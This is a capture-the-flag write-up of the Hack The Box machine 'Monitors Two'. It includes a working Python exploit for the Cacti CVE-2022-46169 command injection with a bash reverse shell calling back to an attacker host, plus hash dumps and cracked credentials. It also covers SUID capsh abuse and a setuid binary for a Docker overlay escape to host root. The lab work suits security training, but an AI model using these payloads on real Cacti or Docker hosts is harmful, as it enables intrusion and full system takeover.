![](assets/pwned.png)

# Monitors Two Writeup (Easy HTB Machine)

As always start off with an NMAP Scan to discover running services.

```
nmap -sS -sV -p- -o nmap/scan.txt 10.10.11.211
```

```
Nmap scan report for 10.10.11.211
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/2%OT=22%CT=1%CU=40531%PV=Y%DS=2%DC=T%G=Y%TM=64514825
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3
OS:=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Viewing port 80 shows the following:
![](assets/cactilogin.png)
From this we can understand that 'Cacti Version 1.2.22' is running, searching for an exploit to use against this service, it was found to be vulnerable to 'CVE-2022-46169'

Starting an NC 'NetCat' Listener on Port '4444' and developing a custom python script and running it against the service resulted in a reverse shell into the machine.

```
nc -lvvnp 4444
```

```py
# CVE-2022-46169
# Author: rossSec
# Desc: Quick reverse shell

import requests

payload = '; /bin/bash -c \'bash -i >& /dev/tcp/10.10.14.19/4444 0>&1\''

local_data_ids = [x for x in range(0, 50)]
target_ip = http://10.10.11.211

for id in range(50):
    url = target_ip + '/remote_agent.php'
    params = {'action': 'polldata', 'host_id': id,
              'poller_id': payload, 'local_data_ids[]': local_data_ids}
    headers = {'X-Forwarded-For': '127.0.0.1'}
    r = requests.get(url, params=params, headers=headers)
```

![](assets/wwwshell.png)

After some enumeration password hashes were found in 'var/www/html/cacti.sql'

```
INSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);
```

Cracking the hashes in hashcat resulted in both of them containing the password 'admin', unfortunately using these credentials did not prove useful anywhere.

It was at this point it was discovered we were in some sort of container as the home directories did not really contain much, proceeding from this I discovered '/entrypoint.sh' which contained the following:
![](assets/entry.png)

Logging into the mySQL database resulted in even more password hashes and the discovery of the user 'marcus'

```
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	11	on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	00
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune marcus@monitorstwo.htb	
```

Cracking marcus's hash gave us the password

```
funkymonkey
```

From here I was confused for a while as I could not login to the user marcus on the machine I started looking for external hosts.

```
cat /etc/hosts
```

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.19.0.3	50bca5e748b0
```

The IP range '172.19.0.x' was discovered so a ping sweep was done to try and discover other hosts. From this the IP '172.19.0.1' was discovered. However SSH was not installed on the machine. I decided to just try from the host machine.

From the credentials recieved earlier an SSH attempt was attempted using 'marcus:funkymonkey'.

![](assets/user.png)

As you can see access to the 'marcus' user was granted and we could grab the user.txt.

![](assets/userflag.png)

After some enumeration on the SSH marcus had some mail from an administrator disclosing some CVE's they were concerned about. '/var/mail/marcus'

```
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
```

After hours and HOURS of research I finally stumbled upon this article from cyberark disclosing how they rooted a docker machine and managed to get root access on the host.

https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure

From this I discovered that I would have to gain root access on the docker container so I started looking for paths.

```
find / -perm -u=s -type f 2>/dev/null
```

The SUID bit '/sbin/capsh' was discovered and it was exploited via the following:

```
/sbin/capsh --gid=0 --uid=0 --
```

![](assets/root1.png)
Shoutout to GTFO Bins for the method: https://gtfobins.github.io/gtfobins/capsh/#suid

From here I decided to fully exploit via the method discovered in the cyberark article:

Go to the / directory and create a folder called 'demo' and within it a file called 'setuid.c'

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);

    system("/bin/bash");
    return 0;
}

```

Compile it

```
gcc -o setuid setuid.c
```

Perform the exploit

```
setcap cap_setgid,cap_setuid+eip setuid
```

Go back to the SSH machine where we are logged in as 'marcus'

```
findmnt
```

Discover the docker container:
![](assets/docke.png)

Go to the merged directory:

```
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

Exploit and get root:

![](assets/root.png)

Now the machine is rooted, overall I enjoyed this machine as the 2nd privilege escalation path was something I have never ran into before.

